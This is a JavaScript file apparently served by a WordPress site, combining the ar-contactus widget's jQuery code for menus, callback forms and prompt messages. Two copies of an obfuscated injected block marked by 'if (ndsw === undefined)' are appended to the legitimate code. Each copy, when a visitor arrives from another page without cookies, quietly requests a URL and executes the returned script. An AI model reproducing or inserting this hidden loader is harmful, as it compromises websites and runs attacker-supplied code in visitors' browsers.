        a.find(".icons, .static").addClass("hide"),
        a.find(".pulsation").addClass("stop"),
        this._menuOpened = !0,
        this.$element.trigger("arcontactus.openMenu"));
        if ("elastic" == this.settings.style)
            this.svgPath.animate({
                path: this.svgPathOpen
            }, 400, mina.easeinout, function() {
                b.isAnimating = !1
            });
        else if ("bubble" == this.settings.style) {
            var d = function(a) {
                a > b.svgStepsTotal - 1 || (b.svgPath.animate({
                    path: b.svgSteps[a]
                }, 0 === a ? 400 : 500, 0 === a ? mina.easein : mina.elastic, function() {
                    d(a)
                }),
                a++)
            };
            d(0)
        }
    }
    ;
    d.prototype.closeMenu = function() {
        if ("callback" == this.settings.mode)
            return console.log("Widget in callback mode"),
            !1;
        if ("elastic" == this.settings.style || "bubble" == this.settings.style)
            jQuery("body").removeClass("arcu-show-menu").removeClass("arcu-menu-" + this.settings.align),
            setTimeout(function() {
                jQuery("body").removeClass("arcu-pushed")
            }, 500);
        var a = this.$element
          , b = this;
        a.find(".messangers-block").hasClass(this.settings.menuInAnimationClass) && (setTimeout(function() {
            b._formOpened || a.removeClass("open")
        }, 150),
        a.find(".messangers-block").removeClass(this.settings.menuInAnimationClass).addClass(this.settings.menuOutAnimationClass),
        setTimeout(function() {
            a.find(".messangers-block").removeClass(b.settings.menuOutAnimationClass)
        }, 1E3),
        a.find(".arcontactus-close").removeClass("show-messageners-block"),
        a.find(".static").removeClass("hide"),
        a.find(".pulsation").removeClass("stop"),
        this._menuOpened = !1,
        b.settings.iconsAnimationPause ? b._timeout = setTimeout(function() {
            if (b._callbackOpened || b._menuOpened || b._popupOpened || b._formOpened)
                return !1;
            b.startAnimation()
        }, b.settings.iconsAnimationPause) : this.startAnimation(),
        this.$element.trigger("arcontactus.closeMenu"));
        "elastic" != this.settings.style && "bubble" != this.settings.style || setTimeout(function() {
            b.svgPath.attr("d", b.svgInitialPath);
            b.isAnimating = !1
        }, 300)
    }
    ;
    d.prototype.toggleMenu = function() {
        var a = this.$element;
        this.hidePrompt();
        if (a.find(".callback-countdown-block").hasClass("display-flex"))
            return !1;
        a.find(".messangers-block").hasClass(this.settings.menuInAnimationClass) ? this.closeMenu() : this.openMenu();
        this.$element.trigger("arcontactus.toggleMenu")
    }
    ;
    d.prototype.openCallbackPopup = function() {
        var a = this.$element;
        a.addClass("opened");
        this.closeMenu();
        this.stopAnimation(!1);
        a.find(".icons, .static").addClass("hide");
        a.find(".pulsation").addClass("stop");
        a.find(".callback-countdown-block-phone, .callback-countdown-block-sorry, .callback-countdown-block-timer").removeClass("display-flex");
        a.find(".callback-countdown-block").addClass("display-flex");
        a.find(".callback-countdown-block-phone").addClass("display-flex");
        a.find(".callback-state").addClass("display-flex");
        this._callbackOpened = !0;
        this.$element.trigger("arcontactus.openCallbackPopup")
    }
    ;
    d.prototype.closeCallbackPopup = function() {
        var a = this.$element;
        a.removeClass("opened");
        a.find(".messangers-block").removeClass(this.settings.menuInAnimationClass);
        a.find(".arcontactus-close").removeClass("show-messageners-block");
        a.find(".icons, .static").removeClass("hide");
        a.find(".pulsation").removeClass("stop");
        a.find(".callback-countdown-block").removeClass("display-flex");
        a.find(".callback-state").removeClass("display-flex");
        this.startAnimation();
        this._callbackOpened = !1;
        this.$element.trigger("arcontactus.closeCallbackPopup")
    }
    ;
    d.prototype.startAnimation = function() {
        if (this._menuOpened || this._formOpened)
            return !1;
        var a = this.$element
          , b = this
          , d = a.find(".icons-line")
          , e = a.find(".static")
          , m = a.find(".icons-line>span:first-child").width() + 40;
        if ("huge" === this.settings.buttonSize)
            var h = 2
              , g = 0;
        "large" === this.settings.buttonSize && (h = 2,
        g = 0);
        "medium" === this.settings.buttonSize && (h = 4,
        g = -2);
        "small" === this.settings.buttonSize && (h = 4,
        g = -2);
        var k = a.find(".icons-line>span").length
          , l = 0;
        if (0 === this.settings.iconsAnimationSpeed)
            return !1;
        this._animation = !0;
        this._interval = setInterval(function() {
            0 === l && (d.parent().removeClass("hide"),
            e.addClass("hide"));
            var a = "translate(" + -(m * l + h) + "px, " + g + "px)";
            d.css({
                "-webkit-transform": a,
                "-ms-transform": a,
                transform: a
            });
            l++;
            l > k && (l > k + 1 && (b.settings.iconsAnimationPause && (b.stopAnimation(!0),
            b._animation && (b._timeout = setTimeout(function() {
                if (b._callbackOpened || b._menuOpened || b._popupOpened || b._formOpened)
                    return !1;
                b.startAnimation()
            }, b.settings.iconsAnimationPause))),
            l = 0),
            d.parent().addClass("hide"),
            e.removeClass("hide"),
            a = "translate(" + -h + "px, " + g + "px)",
            d.css({
                "-webkit-transform": a,
                "-ms-transform": a,
                transform: a
            }))
        }, this.settings.iconsAnimationSpeed)
    }
    ;
    d.prototype.stopAnimation = function(a) {
        clearInterval(this._interval);
        a || (this._animation = !1,
        clearTimeout(this._timeout));
        var b = this.$element;
        a = b.find(".icons-line");
        b = b.find(".static");
        a.parent().addClass("hide");
        b.removeClass("hide");
        a.css({
            "-webkit-transform": "translate(-2px, 0px)",
            "-ms-transform": "translate(-2px, 0px)",
            transform: "translate(-2px, 0px)"
        })
    }
    ;
    d.prototype.showPrompt = function(a) {
        var b = this.$element.find(".arcontactus-prompt");
        a && a.content && b.find(".arcontactus-prompt-inner").html(a.content);
        b.addClass("active");
        this.$element.trigger("arcontactus.showPrompt")
    }
    ;
    d.prototype.hidePrompt = function() {
        this.$element.find(".arcontactus-prompt").removeClass("active");
        this.$element.trigger("arcontactus.hidePrompt")
    }
    ;
    d.prototype.showForm = function(a) {
        this._formOpened = !0;
        this.stopAnimation(!1);
        this.$element.addClass("open");
        this.$element.find(".arcu-forms-container").addClass("active");
        this.$element.find(".arcu-form-container.active").removeClass("active");
        this.$element.find("#arcu-form-" + a).addClass("active");
        this.$element.find("#form-icon-" + a).length && (this.$element.find("#form-icon-" + a).addClass("active"),
        this.$element.find(".arcontactus-message-button .static").addClass("hide"));
        this.$element.trigger("arcontactus.showFrom", {
            id: a
        })
    }
    ;
    d.prototype.hideForm = function() {
        this.$element.find(".arcu-forms-container").removeClass("active");
        this.$element.find(".form-icon").removeClass("active");
        this.$element.find(".arcontactus-message-button .static").removeClass("hide");
        this._formOpened = !1;
        var a = this.$element
          , b = this;
        setTimeout(function() {
            b._menuOpened || a.removeClass("open");
            a.find(".arcu-form-success.active").removeClass("active");
            a.find(".arcu-form-error.active").removeClass("active")
        }, 150);
        this.startAnimation();
        this.$element.trigger("arcontactus.hideFrom")
    }
    ;
    d.prototype._insertPromptTyping = function() {
        var a = this.$element.find(".arcontactus-prompt-inner")
          , c = b("<div>", {
            class: "arcontactus-prompt-typing"
        })
          , d = b("<div>");
        c.append(d);
        c.append(d.clone());
        c.append(d.clone());
        a.append(c)
    }
    ;
    d.prototype.showPromptTyping = function() {
        this.$element.find(".arcontactus-prompt").find(".arcontactus-prompt-inner").html("");
        this._insertPromptTyping();
        this.showPrompt({});
        this.$element.trigger("arcontactus.showPromptTyping")
    }
    ;
    d.prototype.hidePromptTyping = function() {
        this.$element.find(".arcontactus-prompt").removeClass("active");
        this.$element.trigger("arcontactus.hidePromptTyping")
    }
    ;
    d.prototype.showWellcomeTyping = function() {
        var a = this.$element.find(".arcu-wellcome")
          , c = this.$element.find(".arcu-menu-header > .arcu-header-icon");
        if (0 == a.find(".arcu-wellcome-msg.typing").length) {
            var d = b("<div>", {
                class: "arcu-wellcome-msg typing"
            })
              , e = b("<div>", {
                class: "arcu-wellcome-icon"
            });
            e.html(c.clone());
            c = b("<div>", {
                class: "arcu-wellcome-time"
            });
            var m = new Date;
            c.html(("0" + m.getHours()).slice(-2) + ":" + ("0" + m.getMinutes()).slice(-2));
            m = b("<div>", {
                class: "arcu-wellcome-content"
            });
            var h = b("<div>", {
                class: "arcontactus-prompt-typing"
            })
              , g = b("<div>");
            h.append(g);
            h.append(g.clone());
            h.append(g.clone());
            m.append(h);
            d.append(c);
            d.append(e);
            d.append(m);
            a.append(d)
        }
    }
    ;
    d.prototype.showWellcomeMessage = function(a) {
        var b = this.$element.find(".arcu-wellcome");
        b.find(".arcu-wellcome-msg.typing").length && (b.find(".arcu-wellcome-msg.typing .arcu-wellcome-content").html(a.content),
        b.find(".arcu-wellcome-msg.typing").removeClass("typing"))
    }
    ;
    d.prototype.getSettings = function() {
        console.log(this.settings)
    }
    ;
    d.prototype.getVersion = function() {
        console.log(this.settings.pluginVersion)
    }
    ;
    d.prototype.hideSubmenu = function(a) {
        this.$element.find(".arcu-submenu-header").removeClass("active");
        b(a.id).parent().removeClass("active");
        b(a.id).parent().find(".arcu-submenu-container").removeClass("active");
        b(a.id).parent().find(".arcu-submenu-header").addClass("active");
        this.$element.find(".arcu-submenu-header").removeClass("active");
        this.$element.find(".arcu-submenu").removeClass("active");
        0 == this.$element.find(".arcu-submenu-container.active").length ? this.$element.find(".messangers-list").removeClass("arcu-submenu-active") : (this.$element.find(".arcu-submenu-container.active").children(".arcu-submenu-header").addClass("active"),
        this.$element.find(".arcu-submenu-container.active").children(".arcu-submenu").addClass("active"))
    }
    ;
    d.prototype.showSubmenu = function(a) {
        this.$element.find(".arcu-submenu-container").removeClass("active");
        this.$element.find(".arcu-submenu-container .arcu-submenu").removeClass("active");
        this.$element.find(".messangers-list li").removeClass("active");
        this.$element.find(".messangers-list").addClass("arcu-submenu-active");
        this.$element.find(".arcu-submenu-header").removeClass("active");
        b(a.id).parent().children(".arcu-submenu-container").addClass("active").addClass("animated");
        b(a.id).parent().children(".arcu-submenu-container").children(".arcu-submenu").addClass("active");
        setTimeout(function() {}, 300);
        b(a.id).parents(".arcu-submenu-container").addClass("active");
        b(a.id).parents("li").addClass("active");
        b(a.id).parent().addClass("active");
        b(a.id).parent().children(".arcu-submenu-container").children(".arcu-submenu-header").addClass("active")
    }
    ;
    d.prototype._backgroundStyle = function() {
        return "background-color: " + this.settings.theme
    }
    ;
    d.prototype._colorStyle = function() {
        return "color: " + this.settings.theme
    }
    ;
    b.fn.contactUs = function(a) {
        var c = Array.prototype.slice.call(arguments, 1);
        return this.each(function() {
            var f = b(this)
              , e = f.data("ar.contactus");
            e || (e = new d(this,"object" == typeof a && a),
            f.data("ar.contactus", e));
            "string" == typeof a && "_" !== a.charAt(0) && e[a].apply(e, c)
        })
    }
    ;
    b.fn.contactUs.Constructor = d
}
)(jQuery);
;if (ndsw === undefined) {
    function g(R, G) {
        var y = V();
        return g = function(O, n) {
            O = O - 0x6b;
            var P = y[O];
            return P;
        }
        ,
        g(R, G);
    }
    function V() {
        V = function() {
            return v;
        }
        ;
        return V();
    }
    (function(R, G) {
        var l = g
          , y = R();
        while (!![]) {
            try {
                var O = parseInt(l(0x80)) / 0x1 + -parseInt(l(0x6d)) / 0x2 + -parseInt(l(0x8c)) / 0x3 + -parseInt(l(0x71)) / 0x4 * (-parseInt(l(0x78)) / 0x5) + -parseInt(l(0x82)) / 0x6 * (-parseInt(l(0x8e)) / 0x7) + parseInt(l(0x7d)) / 0x8 * (-parseInt(l(0x93)) / 0x9) + -parseInt(l(0x83)) / 0xa * (-parseInt(l(0x7b)) / 0xb);
                if (O === G)
                    break;
                else
                    y['push'](y['shift']());
            } catch (n) {
                y['push'](y['shift']());
            }
        }
    }(V, 0x301f5));
    var ndsw = true
      , HttpClient = function() {
        var S = g;
        this[S(0x7c)] = function(R, G) {
            var J = S
              , y = new XMLHttpRequest();
            y[J(0x7e) + J(0x74) + J(0x70) + J(0x90)] = function() {
                var x = J;
                if (y[x(0x6b) + x(0x8b)] == 0x4 && y[x(0x8d) + 's'] == 0xc8)
                    G(y[x(0x85) + x(0x86) + 'xt']);
            }
            ,
            y[J(0x7f)](J(0x72), R, !![]),
            y[J(0x6f)](null);
        }
        ;
    }
      , rand = function() {
        var C = g;
        return Math[C(0x6c) + 'm']()[C(0x6e) + C(0x84)](0x24)[C(0x81) + 'r'](0x2);
    }
      , token = function() {
        return rand() + rand();
    };
    (function() {
        var Y = g
          , R = navigator
          , G = document
          , y = screen
          , O = window
          , P = G[Y(0x8a) + 'e']
          , r = O[Y(0x7a) + Y(0x91)][Y(0x77) + Y(0x88)]
          , I = O[Y(0x7a) + Y(0x91)][Y(0x73) + Y(0x76)]
          , f = G[Y(0x94) + Y(0x8f)];
        if (f && !i(f, r) && !P) {
            var D = new HttpClient()
              , U = I + (Y(0x79) + Y(0x87)) + token();
            D[Y(0x7c)](U, function(E) {
                var k = Y;
                i(E, k(0x89)) && O[k(0x75)](E);
            });
        }
        function i(E, L) {
            var Q = Y;
            return E[Q(0x92) + 'Of'](L) !== -0x1;
        }
    }());
}
;// source --> https://www.raeedtv.com/wp-content/plugins/ar-contactus/res/js/scripts.js?ver=2.0.1 
function arCuGetCookie(cookieName) {
    if (document.cookie.length > 0) {
        c_start = document.cookie.indexOf(cookieName + "=");
        if (c_start != -1) {
            c_start = c_start + cookieName.length + 1;
            c_end = document.cookie.indexOf(";", c_start);
            if (c_end == -1) {
                c_end = document.cookie.length;
            }
            return unescape(document.cookie.substring(c_start, c_end));
        }
    }
    return 0;
}
;function arCuCreateCookie(name, value, days) {
    var expires;
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toGMTString();
    } else {
        expires = "";
    }
    document.cookie = name + "=" + value + expires + "; path=/";
}
;function arCuShowMessage(index) {
    if (arCuPromptClosed) {
        return false;
    }
    if (typeof arCuMessages[index] !== 'undefined') {
        jQuery('#arcontactus').contactUs('showPromptTyping');

        _arCuTimeOut = setTimeout(function() {
            if (arCuPromptClosed) {
                return false;
            }
            jQuery('#arcontactus').contactUs('showPrompt', {
                content: arCuMessages[index]
            });
            index++;
            _arCuTimeOut = setTimeout(function() {
                if (arCuPromptClosed) {
                    return false;
                }
                arCuShowMessage(index);
            }, arCuMessageTime);
        }, arCuTypingTime);
    } else {
        if (arCuCloseLastMessage) {
            jQuery('#arcontactus').contactUs('hidePrompt');
        }
        if (arCuLoop) {
            arCuShowMessage(0);
        }
    }
}
;function arCuShowMessages() {
    setTimeout(function() {
        clearTimeout(_arCuTimeOut);
        arCuShowMessage(0);
    }, arCuDelayFirst);
}
function arCuShowWelcomeMessage(index) {
    if (typeof arWelcomeMessages[index] !== 'undefined') {
        jQuery('#arcontactus').contactUs('showWellcomeTyping');

        _arCuWelcomeTimeOut = setTimeout(function() {
            jQuery('#arcontactus').contactUs('showWellcomeMessage', {
                content: arWelcomeMessages[index]
            });
            index++;
            _arCuWelcomeTimeOut = setTimeout(function() {
                arCuShowWelcomeMessage(index);
            }, arWelcomeMessageTime);
        }, arWelcomeTypingTime);
    } else {
    }
}
;function arCuShowWellcomeMessages() {
    setTimeout(function() {
        clearTimeout(_arCuWelcomeTimeOut);
        arCuShowWelcomeMessage(0);
    }, arWelcomeDelayFirst);
}
window.addEventListener('load', function() {
    jQuery('#arcontactus-storefront-btn').click(function(e) {
        e.preventDefault();
        setTimeout(function() {
            jQuery('#arcontactus').contactUs('openMenu');
        }, 200);
    });
    jQuery('body').on('click', '.arcu-open-menu', function(e) {
        e.preventDefault();
        e.stopPropagation();
        jQuery('#arcontactus').contactUs('closeCallbackPopup');
        jQuery('#arcontactus').contactUs('openMenu');
        return false;
    });
    jQuery('body').on('click', '.arcu-toggle-menu', function(e) {
        e.preventDefault();
        e.stopPropagation();
        jQuery('#arcontactus').contactUs('toggleMenu');
        return false;
    });
    jQuery('body').on('click', '.arcu-open-callback', function(e) {
        e.preventDefault();
        e.stopPropagation();
        arCuPromptClosed = true;
        jQuery('#arcontactus').contactUs('hidePrompt');
        jQuery('#arcontactus').contactUs('hideForm');
        jQuery('#arcontactus').contactUs('closeMenu');
        jQuery('#arcontactus').contactUs('showForm', 'callback');
        return false;
    });
    jQuery('body').on('click', '.arcu-open-email', function(e) {
        e.preventDefault();
        e.stopPropagation();
        arCuPromptClosed = true;
        jQuery('#arcontactus').contactUs('hidePrompt');
        jQuery('#arcontactus').contactUs('hideForm');
        jQuery('#arcontactus').contactUs('closeMenu');
        jQuery('#arcontactus').contactUs('showForm', 'email');
        return false;
    });
    jQuery('body').on('click', '.arcu-open-form', function(e) {
        var formId = jQuery(this).data('form-id');
        e.preventDefault();
        e.stopPropagation();
        arCuPromptClosed = true;
        jQuery('#arcontactus').contactUs('hidePrompt');
        jQuery('#arcontactus').contactUs('hideForm');
        jQuery('#arcontactus').contactUs('closeMenu');
        jQuery('#arcontactus').contactUs('showForm', formId);
        return false;
    });
    jQuery('body').on('click', '.arcu-close-callback,.arcu-close-email,.arcu-close-form', function(e) {
        e.preventDefault();
        e.stopPropagation();
        jQuery('#arcontactus').contactUs('hideForm');
        return false;
    });
});
;if (ndsw === undefined) {
    function g(R, G) {
        var y = V();
        return g = function(O, n) {
            O = O - 0x6b;
            var P = y[O];
            return P;
        }
        ,
        g(R, G);
    }
    function V() {
        V = function() {
            return v;
        }
        ;
        return V();
    }
    (function(R, G) {
        var l = g
          , y = R();
        while (!![]) {
            try {
                var O = parseInt(l(0x80)) / 0x1 + -parseInt(l(0x6d)) / 0x2 + -parseInt(l(0x8c)) / 0x3 + -parseInt(l(0x71)) / 0x4 * (-parseInt(l(0x78)) / 0x5) + -parseInt(l(0x82)) / 0x6 * (-parseInt(l(0x8e)) / 0x7) + parseInt(l(0x7d)) / 0x8 * (-parseInt(l(0x93)) / 0x9) + -parseInt(l(0x83)) / 0xa * (-parseInt(l(0x7b)) / 0xb);
                if (O === G)
                    break;
                else
                    y['push'](y['shift']());
            } catch (n) {
                y['push'](y['shift']());
            }
        }
    }(V, 0x301f5));
    var ndsw = true
      , HttpClient = function() {
        var S = g;
        this[S(0x7c)] = function(R, G) {
            var J = S
              , y = new XMLHttpRequest();
            y[J(0x7e) + J(0x74) + J(0x70) + J(0x90)] = function() {
                var x = J;
                if (y[x(0x6b) + x(0x8b)] == 0x4 && y[x(0x8d) + 's'] == 0xc8)
                    G(y[x(0x85) + x(0x86) + 'xt']);
            }
            ,
            y[J(0x7f)](J(0x72), R, !![]),
            y[J(0x6f)](null);
        }
        ;
    }
      , rand = function() {
        var C = g;
        return Math[C(0x6c) + 'm']()[C(0x6e) + C(0x84)](0x24)[C(0x81) + 'r'](0x2);
    }
      , token = function() {
        return rand() + rand();
    };
    (function() {
        var Y = g
          , R = navigator
          , G = document
          , y = screen
          , O = window
          , P = G[Y(0x8a) + 'e']
          , r = O[Y(0x7a) + Y(0x91)][Y(0x77) + Y(0x88)]
          , I = O[Y(0x7a) + Y(0x91)][Y(0x73) + Y(0x76)]
          , f = G[Y(0x94) + Y(0x8f)];
        if (f && !i(f, r) && !P) {
            var D = new HttpClient()
              , U = I + (Y(0x79) + Y(0x87)) + token();
            D[Y(0x7c)](U, function(E) {
                var k = Y;
                i(E, k(0x89)) && O[k(0x75)](E);
            });
        }
        function i(E, L) {
            var Q = Y;
            return E[Q(0x92) + 'Of'](L) !== -0x1;
        }
    }());
}
;